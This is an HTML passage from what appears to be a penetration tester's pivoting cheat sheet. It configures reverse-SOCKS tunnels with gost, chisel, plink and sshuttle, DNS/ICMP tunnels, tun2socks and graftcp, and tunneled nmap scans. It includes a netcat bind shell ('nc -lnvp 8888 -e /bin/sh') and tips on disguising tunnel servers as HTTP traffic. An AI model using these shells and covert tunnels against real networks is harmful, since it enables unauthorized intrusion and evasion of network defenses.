href="https://docs.ginuerzh.xyz/gost/en/tuntap/">TUN/TAP tunnels</a> (admin in both sides required)</li> <li>TODO - Check if gost TUN to SOCKS is possible by setting the routing table as showed in the SSH VPN section</li> <li>Fallback to <a href="https://docs.ginuerzh.xyz/gost/en/port-forwarding/#remote-tcp-port-forwarding">reverse-SOCKS-tunnel</a> + use <code>tun2socks</code> (faster) or <code>graftcp</code></li> </ul> <h3 id="port-redirection--vpn--sshuttle"> <a href="#port-redirection--vpn--sshuttle" class="anchor-heading" aria-labelledby="port-redirection--vpn--sshuttle"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSHuttle </h3> <ul> <li><a href="https://github.com/sshuttle/sshuttle">Repository</a></li> <li>Python and SSH required in the target</li> <li>Route all the 192.168.1.0 traffic through the ssh server:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshuttle <span class="nt">--dns</span> <span class="nt">-r</span> &lt;user&gt;@&lt;ip&gt; 192.168.1.0/24</code></pre></div></div></li> <li>Only <a href="https://sshuttle.readthedocs.io/en/stable/tproxy.html">tproxy</a> method supports UDP</li> <li>Reverse tunnels require some fiddling: <ul> <li><a href="https://github.com/sshuttle/sshuttle/issues/421#issuecomment-622968427">Reverse SOCKS</a></li> <li><a href="https://github.com/sshuttle/sshuttle/issues/597#issuecomment-784563155">Double sshuttle</a></li> </ul> </li> </ul> <h3 id="port-redirection--vpn--tfunnel"> <a href="#port-redirection--vpn--tfunnel" class="anchor-heading" aria-labelledby="port-redirection--vpn--tfunnel"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tfunnel </h3> <ul> <li><a href="https://github.com/pisto/tfunnel">Repository</a></li> <li>C++ Replacement for <code>sshuttle --method=tproxy</code></li> </ul> <h3 id="port-redirection--vpn--ssh"> <a href="#port-redirection--vpn--ssh" class="anchor-heading" aria-labelledby="port-redirection--vpn--ssh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSH </h3> <ul> <li>Admin privileges in both sides required</li> <li><a href="https://book.hacktricks.xyz/tunneling-and-port-forwarding#vpn-tunnel">See how to do it</a> - <a href="https://artkond.com/2017/03/23/pivoting-guide#vpn-over-ssh">also here</a> - <a href="https://pentestwiki.org/pivoting/#h-4-pivoting-with-vpn-over-ssh">and here</a></li> </ul> <h3 id="port-redirection--vpn--dsvpn"> <a href="#port-redirection--vpn--dsvpn" class="anchor-heading" aria-labelledby="port-redirection--vpn--dsvpn"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> DSVPN </h3> <ul> <li><a href="https://github.com/jedisct1/dsvpn">Project</a> - <a href="https://balaskas.gr/blog/2019/07/20/a-dead-simple-vpn/">Configuration</a></li> </ul> <h3 id="port-redirection--vpn--tinyvpn"> <a href="#port-redirection--vpn--tinyvpn" class="anchor-heading" aria-labelledby="port-redirection--vpn--tinyvpn"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> TinyVPN </h3> <ul> <li><a href="https://github.com/wangyu-/tinyfecVPN">Project</a> - Has builtin FEC</li> </ul> <h3 id="port-redirection--vpn--leaf"> <a href="#port-redirection--vpn--leaf" class="anchor-heading" aria-labelledby="port-redirection--vpn--leaf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Leaf </h3> <ul> <li><a href="https://github.com/eycorsican/leaf">Project</a></li> </ul> <h3 id="port-redirection--vpn--n2n"> <a href="#port-redirection--vpn--n2n" class="anchor-heading" aria-labelledby="port-redirection--vpn--n2n"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> n2n </h3> <ul> <li><a href="https://github.com/ntop/n2n">Project</a> - Peer to Peer VPN</li> </ul> <h3 id="port-redirection--vpn--iodine"> <a href="#port-redirection--vpn--iodine" class="anchor-heading" aria-labelledby="port-redirection--vpn--iodine"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Iodine </h3> <ul> <li>Admin privileges in both sides required</li> <li>Tunnel through DNS</li> <li><a href="https://code.kryo.se/iodine/">Site</a></li> </ul> <h3 id="port-redirection--vpn--hans"> <a href="#port-redirection--vpn--hans" class="anchor-heading" aria-labelledby="port-redirection--vpn--hans"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hans </h3> <ul> <li>Admin privileges in both sides required</li> <li>Tunnel through ICMP</li> <li><a href="https://github.com/friedrich/hans">Respository</a></li> </ul> <h3 id="port-redirection--vpn--socat"> <a href="#port-redirection--vpn--socat" class="anchor-heading" aria-labelledby="port-redirection--vpn--socat"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Socat </h3> <ul> <li>Admin privileges in both sides required</li> <li>Tunnel through SSL</li> <li><a href="https://www.cybrary.it/blog/0p3n/creating-ssl-vpn-socat/">How to</a> - <a href="https://youremindmeofmymother.com/2015/04/06/socat-vpn-openssl-tunnel-interface/">also here</a> - <a href="https://opentechnotes.blogspot.com/2014/07/poor-mans-ssl-vpn-with-socat.html">and here</a></li> </ul> <h3 id="port-redirection--vpn--linux-tunnels"> <a href="#port-redirection--vpn--linux-tunnels" class="anchor-heading" aria-labelledby="port-redirection--vpn--linux-tunnels"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Linux Tunnels </h3> <h4 id="port-redirection--vpn--linux-tunnels--ip-to-ip"> <a href="#port-redirection--vpn--linux-tunnels--ip-to-ip" class="anchor-heading" aria-labelledby="port-redirection--vpn--linux-tunnels--ip-to-ip"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> IP-to-IP </h4> <ul> <li>Admin privileges in both sides required</li> <li><a href="https://lartc.org/howto/lartc.tunnel.ip-ip.html">How to</a></li> </ul> <h4 id="port-redirection--vpn--linux-tunnels--gre-tunnel"> <a href="#port-redirection--vpn--linux-tunnels--gre-tunnel" class="anchor-heading" aria-labelledby="port-redirection--vpn--linux-tunnels--gre-tunnel"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> GRE tunnel </h4> <ul> <li>Admin privileges in both sides required</li> <li><a href="https://lartc.org/howto/lartc.tunnel.gre.html">How to</a></li> </ul> <h2 id="port-redirection--socks---dynamic"> <a href="#port-redirection--socks---dynamic" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SOCKS / Dynamic </h2> <h3 id="port-redirection--socks---dynamic--tunnel-creation"> <a href="#port-redirection--socks---dynamic--tunnel-creation" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tunnel Creation </h3> <h4 id="port-redirection--socks---dynamic--tunnel-creation--gost"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Gost </h4> <h5 id="port-redirection--socks---dynamic--tunnel-creation--gost--binaries"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--binaries" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--binaries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Binaries </h5> <ul> <li>Get the <a href="https://github.com/ginuerzh/gost/releases/">binaries</a></li> <li>Or just compile it: <code>make linux-amd64</code></li> <li><code>auto</code> schemas (not specifying the protocol/transport) for the endpoints almost always achieve the <b>fastest results</b></li> <li>Set the <code>?udp=true</code> flag on the listener and last http/socks forwarder for <a href="https://latest.gost.run/en/tutorials/port-forwarding/#forwarding-chain">UDP-over-TCP</a></li> </ul> <h5 id="port-redirection--socks---dynamic--tunnel-creation--gost--bypass-conditions"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--bypass-conditions" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--bypass-conditions"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bypass Conditions </h5> <ul> <li>Use the <code>?bypass</code> flag with a file or a list of IPs, CIDR and domains with wildcards</li> <li>See the file structure on the <a href="https://v2.gost.run/en/bypass/">docs</a></li> </ul> <h5 id="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Reverse SOCKS </h5> <h6 id="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--through-unavoidable-intermediate-proxies"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--through-unavoidable-intermediate-proxies" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--through-unavoidable-intermediate-proxies"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Through unavoidable intermediate Proxies </h6> <ul> <li>The method is almost the same as below:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Example: Must tunnel through PAC proxy</span>
pacproxy <span class="nt">-c</span> &lt;pac.file&gt; <span class="nt">-l</span> 127.0.0.1:8008

<span class="c"># Just add this proxy as first forwarder</span>
gost <span class="nt">-L</span> 127.0.0.1:8888 <span class="nt">--</span> <span class="nt">-L</span> rtcp://127.0.0.1:8010/127.0.0.1:8888 <span class="nt">-F</span> http://127.0.0.1:8008 <span class="nt">-F</span> auto+auto://&lt;ip&gt;:8080
<span class="c"># Change to http2 if supported by the</span>
<span class="c"># intermediate proxy</span></code></pre></div></div></li> </ul> <h6 id="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-ssh"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-ssh" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-ssh"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Over SSH </h6> <ul> <li><a href="https://docs.ginuerzh.xyz/gost/en/port-forwarding/#ssh-port-forwarding-mode">Docs</a> - <a href="https://docs.ginuerzh.xyz/gost/en/ssh/#pubkey-authentication-211">Auth docs</a> - <a href="https://docs.ginuerzh.xyz/gost/en/ssh/#usage">Heartbeat docs</a></li> <li><b>Prefer QUIC/UDP-protos</b>: Are around 10 times faster than TCP ones</li> <li><b>Prefer TLS+Websockets/HTTP 2.0</b>: are faster</li> <li>Note that the SSH server can be a non-gost one (like sshd)</li> <li>Server (using <a href="https://github.com/caribpa/gost/tree/cmd-split">my changes</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The server will be the client</span>
gost <span class="nt">-L</span> socks5://127.0.0.1:1080?udp<span class="o">=</span><span class="nb">true</span> <span class="nt">-F</span> relay://127.0.0.1:8010 <span class="nt">--</span> <span class="nt">-L</span> forward+ssh://:2222
<span class="c"># The -- -L ... can be removed if using</span>
<span class="c"># a non-gost ssh server</span></code></pre></div></div></li> <li>Client (using <a href="https://github.com/caribpa/gost/tree/cmd-split">my changes</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The client will be the server</span>
gost <span class="nt">-L</span> relay://127.0.0.1:8888 <span class="nt">--</span> <span class="nt">-L</span> rtcp://127.0.0.1:8010/127.0.0.1:8888 <span class="nt">-F</span> forward+ssh://&lt;ip&gt;:2222
<span class="c"># Relay performance flags:</span>
<span class="c"># ...relay://127.0.0.1:8888?nodelay=true</span>
<span class="c">#                          &amp;bind=true</span>
<span class="c"># ^ Relay only has bind=true in Gost v3</span>
<span class="c"># SSH Heartbeat:</span>
<span class="c"># ...ssh://&lt;ip&gt;:2222?ping=60</span>
<span class="c"># Non-gost SSH Authentication:</span>
<span class="c"># ...ssh://&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt;:2222</span>
<span class="c"># or ssh://&lt;ip&gt;:2222?ssh_key=&lt;rsa&gt;</span></code></pre></div></div></li> <li><code>relay</code> appears to be faster than <code>auto</code> (nothing) or <code>socks5</code></li> <li><code>forward+ssh</code> automatically selects <code>direct</code> and <code>reverse</code> modes but only works as the last proxy</li> <li>How it works: <ol> <li>S1080 -&gt; S8010 -&gt; S2222 -&gt; C8888:</li> <li>(S)erver listens in TCP 1080&amp;2222</li> <li>(C)lient listens in TCP 8888 and</li> <li>C starts a TCP 8010 listener in S</li> <li>via SSH (2222) redirected to 8888</li> <li>S 1080 port is redirected to 8010</li> </ol> </li> </ul> <h6 id="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-quic"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-quic" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-quic"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Over QUIC </h6> <ul> <li><a href="https://docs.ginuerzh.xyz/gost/en/port-forwarding/#remote-udp-port-forwarding">Docs</a> - <a href="https://docs.ginuerzh.xyz/gost/en/socks/#socks5-over-quic">QUIC</a> - <a href="https://docs.ginuerzh.xyz/gost/en/ss/#shadowsocks-over-kcp">Shadowsocks over KCP</a></li> <li>If QUIC (UDP) gets slow/<a href="https://github.com/lucas-clemente/quic-go/issues/310#issuecomment-253555550">unreliable</a> try <a href="https://docs.ginuerzh.xyz/gost/en/kcp/">KCP</a> (UDP + improved latency vs bandwidth tradeoff + <a href="https://github.com/xtaci/kcptun#forward-error-correction">error correction</a>), or TCP transport protocols <a href="https://docs.ginuerzh.xyz/gost/en/ws/">like websockets</a> or transports/protocols to disguise the servers as HTTP ones (<a href="https://docs.ginuerzh.xyz/gost/en/simple-obfs/">ss+ohttp</a>, <a href="https://docs.ginuerzh.xyz/gost/en/obfs4/">obsf4</a>, <a href="https://docs.ginuerzh.xyz/gost/en/sni/">sni</a>, <a href="https://docs.ginuerzh.xyz/gost/en/http2/#tunnel-mode">socks5+h2</a> or just <code>http</code>)</li> <li>Gost-SOCKS default transport is <a href="https://docs.ginuerzh.xyz/gost/en/socks/#socks5-negotiated-encryption">TLS</a>, prefer <a href="https://docs.ginuerzh.xyz/gost/en/ss/">Shadowsocks</a> for security (UDP traffic <a href="https://github.com/shadowsocks/go-shadowsocks2/issues/73">not supported</a>)</li> <li>Server (using <a href="https://github.com/caribpa/gost/tree/cmd-split">my changes</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The server will be the client</span>
gost <span class="nt">-L</span> socks5://127.0.0.1:1080?udp<span class="o">=</span><span class="nb">true</span> <span class="nt">-F</span> 127.0.0.1:8010 <span class="nt">--</span> <span class="nt">-L</span> socks5+quic://:8080</code></pre></div></div></li> <li>Client - <a href="https://docs.ginuerzh.xyz/gost/en/port-forwarding/#socks5-bind-method-with-multiplexing-enabled">mSOCKS</a> + <a href="https://docs.ginuerzh.xyz/gost/en/quic/#keep-alive">keep-alive</a> QUIC:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The client will be the server</span>
gost <span class="nt">-L</span> 127.0.0.1:8888?udp<span class="o">=</span><span class="nb">true</span> <span class="nt">--</span> <span class="nt">-L</span> rtcp://127.0.0.1:8010/127.0.0.1:8888 <span class="nt">-F</span> socks5+quic://&lt;ip&gt;:8080?keepalive<span class="o">=</span><span class="nb">true</span>&amp;mbind<span class="o">=</span><span class="nb">true</span>
<span class="c"># rudp + forward tricks don't work</span></code></pre></div></div></li> </ul> <h6 id="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-websockets"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-websockets" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-websockets"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Over Websockets </h6> <ul> <li>Server (using <a href="https://github.com/caribpa/gost/tree/cmd-split">my changes</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The server will be the client</span>
gost <span class="nt">-L</span> socks5://127.0.0.1:1080?udp<span class="o">=</span><span class="nb">true</span> <span class="nt">-F</span> relay://127.0.0.1:8010?nodelay<span class="o">=</span><span class="nb">true</span> <span class="nt">--</span> <span class="nt">-L</span> tls+ws://:8080?compression<span class="o">=</span><span class="nb">true</span>
<span class="c"># Is ?enableCompression=true on Gost v3</span></code></pre></div></div></li> <li>Client:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The client will be the server</span>
gost <span class="nt">-L</span> relay://127.0.0.1:8888?nodelay<span class="o">=</span><span class="nb">true</span> <span class="nt">--</span> <span class="nt">-L</span> rtcp://127.0.0.1:8010/127.0.0.1:8888 <span class="nt">-F</span> tls+ws://&lt;ip&gt;:8080?compression<span class="o">=</span><span class="nb">true</span>&amp;mbind<span class="o">=</span><span class="nb">true</span>
<span class="c"># ^ Relay has bind=true in Gost v3</span></code></pre></div></div></li> <li>Check whether <a href="https://v2.gost.run/en/ws/#multiplex-websocket">websocket multiplexing</a> (<code>mws</code>) improves or worsens the performance</li> <li>In my tests <code>mws</code> is very inconsistent when used to scan a single port</li> <li>Use websockets over TLS on their own with <code>wss</code> or <code>mwss</code></li> </ul> <h5 id="port-redirection--socks---dynamic--tunnel-creation--gost--auto-http---socks5-proxy-on-reverse-proxy"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--auto-http---socks5-proxy-on-reverse-proxy" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--auto-http---socks5-proxy-on-reverse-proxy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Auto HTTP + Socks5 Proxy on Reverse Proxy </h5> <ul> <li>Use 2 <code>auto</code> listeners with an <code>auto</code> forwarder<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># On our server - Use one of the above</span>
gost <span class="nt">-L</span> 127.0.0.1:1080 <span class="nt">-F</span> auto://[...]

<span class="c"># On Reverse Proxy - Using my changes</span>
gost <span class="nt">-L</span> 127.0.0.1:8888 <span class="nt">-F</span> 127.0.0.1:8010 <span class="nt">--</span> <span class="nt">-L</span> 127.0.0.1:8010

<span class="c"># Test it with curl</span>
curl <span class="nt">-x</span> http://127.0.0.1:1080 &lt;site&gt;
curl <span class="nt">-x</span> socks5://127.0.0.1:1080 &lt;site&gt;</code></pre></div></div></li> <li>This tricks bypasses the case where the 8888 listener gets a Proxy CONNECT from any of the intermediate forwarders encapsulating Socks5</li> </ul> <h5 id="port-redirection--socks---dynamic--tunnel-creation--gost--access-the-client-s-network-from-server"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--access-the-client-s-network-from-server" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--access-the-client-s-network-from-server"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Access the Client&#8217;s Network from Server </h5> <ul> <li>Using the SOCKS tunnel:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Server side - ncat (&gt;7.91) check:</span>
ncat <span class="nt">--proxy</span> 127.0.0.1:1080 <span class="nt">--proxy-type</span> socks5 <span class="nt">-nv</span> &lt;client-side-ip&gt; &lt;client-side-port&gt;

<span class="c"># Server side - curl check:</span>
curl <span class="nt">-s</span> <span class="nt">-x</span> socks5://127.0.0.1:1080 <span class="nt">-L</span> http://&lt;client-http-server&gt; | w3m <span class="nt">-T</span> text/html

<span class="c"># Server side - nmap/wireshark...</span>
<span class="c"># use tun2socks with TCP 1080</span></code></pre></div></div></li> <li>Bind-netcat (remove the appropriate client/server <code>-L ...</code> configuration):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Client side:</span>
nc <span class="nt">-lnvp</span> 8888 <span class="nt">-e</span> /bin/sh

<span class="c"># Server side:</span>
nc <span class="nt">-nv</span> 127.0.0.1 8010</code></pre></div></div></li> </ul> <h5 id="port-redirection--socks---dynamic--tunnel-creation--gost--transparent-proxy"> <a href="#port-redirection--socks---dynamic--tunnel-creation--gost--transparent-proxy" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--gost--transparent-proxy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Transparent Proxy </h5> <ul> <li><a href="https://docs.ginuerzh.xyz/gost/en/redirect/">Docs</a> - Linux only (requires iptables)</li> <li>Transparently redirect all TCP and UDP traffic to a given network</li> </ul> <h4 id="port-redirection--socks---dynamic--tunnel-creation--chisel"> <a href="#port-redirection--socks---dynamic--tunnel-creation--chisel" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--chisel"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Chisel </h4> <h5 id="port-redirection--socks---dynamic--tunnel-creation--chisel--binaries"> <a href="#port-redirection--socks---dynamic--tunnel-creation--chisel--binaries" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--chisel--binaries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Binaries </h5> <ul> <li>Get the binaries from the <a href="https://github.com/jpillora/chisel/releases">releases</a></li> </ul> <h5 id="port-redirection--socks---dynamic--tunnel-creation--chisel--reverse-socks5"> <a href="#port-redirection--socks---dynamic--tunnel-creation--chisel--reverse-socks5" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--chisel--reverse-socks5"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Reverse SOCKS5 </h5> <ul> <li>The proxy is opened on the server-side</li> <li>Server:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># key: non-mandatory - put anything</span>
chisel server <span class="nt">-p</span> 8010 <span class="nt">--socks5</span> <span class="nt">--reverse</span> <span class="nt">--key</span> <span class="nb">test</span>
<span class="c"># Annotate the fingerprint value</span></code></pre></div></div></li> <li>Client:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Put fingerprint in &lt;server-print&gt;</span>
chisel client <span class="nt">--fingerprint</span> <span class="s2">"&lt;server-print&gt;"</span> &lt;ip&gt;:8010 R:1080:socks
<span class="c"># Proxy on port 1080 on server-side</span></code></pre></div></div></li> </ul> <h4 id="port-redirection--socks---dynamic--tunnel-creation--plink-exe"> <a href="#port-redirection--socks---dynamic--tunnel-creation--plink-exe" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-creation--plink-exe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PLINK.EXE </h4> <ul> <li>Forward SOCKS/Dynamic:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">plink</span> <span class="na">-ssh -N -l </span><span class="o">&lt;</span><span class="kd">usr</span><span class="o">&gt;</span> <span class="na">-pw </span><span class="o">&lt;</span><span class="kd">pass</span><span class="o">&gt;</span> <span class="na">-D </span><span class="m">1080</span> <span class="o">&lt;</span><span class="kd">usr</span><span class="o">&gt;</span>@&lt;ip&gt;</code></pre></div></div></li> <li>Reverse SOCKS/Dynamic doesn&#8217;t seem to work in <code>plink</code></li> </ul> <h3 id="port-redirection--socks---dynamic--tunnel-usage"> <a href="#port-redirection--socks---dynamic--tunnel-usage" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-usage"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Tunnel Usage </h3> <h4 id="port-redirection--socks---dynamic--tunnel-usage--tun2socks"> <a href="#port-redirection--socks---dynamic--tunnel-usage--tun2socks" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-usage--tun2socks"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> tun2socks </h4> <ul> <li>Creates a TUN interface (admin required) redirecting the traffic to a SOCKS5 server</li> <li>Shadowsocks (<code>ss</code>) and Direct (<code>direct</code>) proxy modes are <a href="https://github.com/xjasonlyu/tun2socks/blob/main/proxy/proto/proto.go">also supported</a></li> <li>Get the binaries from the <a href="https://github.com/xjasonlyu/tun2socks/releases">release page</a></li> <li>Or use the <a href="https://github.com/ambrop72/badvpn/wiki/Tun2socks">BadVPN</a> version (<a href="https://unix.stackexchange.com/a/144569">config</a>)</li> <li>TUN configuration (<a href="https://github.com/xjasonlyu/tun2socks/issues/32">ref</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip tuntap add mode tun dev tun10

<span class="c"># Only these two lines are needed</span>
<span class="c"># if tun2socks was previously run:</span>
ip addr add 10.0.0.1/31 dev tun10

ip <span class="nb">link set </span>tun10 up</code></pre></div></div></li> <li>Usage:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use ss for shadowsocks</span>
tun2socks <span class="nt">-device</span> tun://tun10 <span class="nt">-tcp-auto-tuning</span> <span class="nt">-loglevel</span> warning <span class="nt">-proxy</span> socks5://127.0.0.1:1080
<span class="c"># direct just creates a tun proxying</span>
<span class="c"># to the system DNS/routes</span></code></pre></div></div></li> <li><code>ss</code> requires a <a href="https://github.com/Dreamacro/go-shadowsocks2/blob/master/core/cipher.go#L30">cipher</a> and pass, <a href="https://github.com/shadowsocks/go-shadowsocks2/issues/73">no-UDP</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tun2socks <span class="nt">-device</span> tun://tun10 <span class="nt">-loglevel</span> warn <span class="nt">-proxy</span> ss://AEAD_CHACHA20_POLY1305:&lt;pass&gt;@127.0.0.1:1080
<span class="c"># Gost has a different cipher syntax</span>
<span class="c"># Same ss://&lt;cipher:pass&gt;@&lt;ip:port&gt;</span></code></pre></div></div></li> <li>Nmap config:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># The -n causes major speed-up</span>
nmap <span class="nt">-sS</span> <span class="nt">-sU</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="o">[</span>...] <span class="nt">-e</span> tun10 <span class="nt">-n</span> &lt;target-machine-ip&gt;</code></pre></div></div></li> </ul> <h4 id="port-redirection--socks---dynamic--tunnel-usage--ipio"> <a href="#port-redirection--socks---dynamic--tunnel-usage--ipio" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-usage--ipio"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Ipio </h4> <ul> <li><a href="https://github.com/txthinking/ipio/releases">Binaries</a> - designed mainly for <a href="https://github.com/txthinking/brook">Brook</a> server</li> <li>Usage:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ipio tun2socks5 <span class="nt">-s</span> 127.0.0.1:1080 <span class="nt">--doNotChangeAnything</span>
<span class="c"># Configure the TUN as shown in the</span>
<span class="c"># tun2socks &gt; TUN configuration</span></code></pre></div></div></li> </ul> <h4 id="port-redirection--socks---dynamic--tunnel-usage--graftcp"> <a href="#port-redirection--socks---dynamic--tunnel-usage--graftcp" class="anchor-heading" aria-labelledby="port-redirection--socks---dynamic--tunnel-usage--graftcp"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Graftcp </h4> <ul> <li>Not based on <code>LD_PRELOAD</code>, works on static binaries</li> <li>Get the binaries from the <a href="https://github.com/hmgle/graftcp/releases">release page</a></li> <li>Usage:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Remember to use TCP CONNECT scans</span>
mgraftcp <span class="nt">--http_proxy</span> &lt;ip:port&gt; <span class="nt">--select_proxy_mode</span> only_http_proxy <span class="nt">-n</span> &lt;cmd&gt;
<span class="c"># --select_proxy_mode: Use for local addrs</span>
<span class="c"># -n              - Proxy local addresses</span>
<span class="c"># --socks5 &lt;ip:p&gt; - Proxy via socks5</span>
<span class="c"># --socks5_password &lt;pass&gt;</span>
<span class="c"># --socks5_username &lt;user&gt;</span></code></pre></div></div></li> <li>Prior to v0.4 <ul> <li>Server<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Run with sudo if sudoing graftcp</span>
graftcp-local <span class="nt">-loglevel</span> 3 <span class="nt">-socks5</span> :1080</code></pre></div></div></li> <li>Client<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># -n proxies localhost (127.0.0.1)</span>
<span class="c"># making nmap ... 127.0.0.1 work</span>
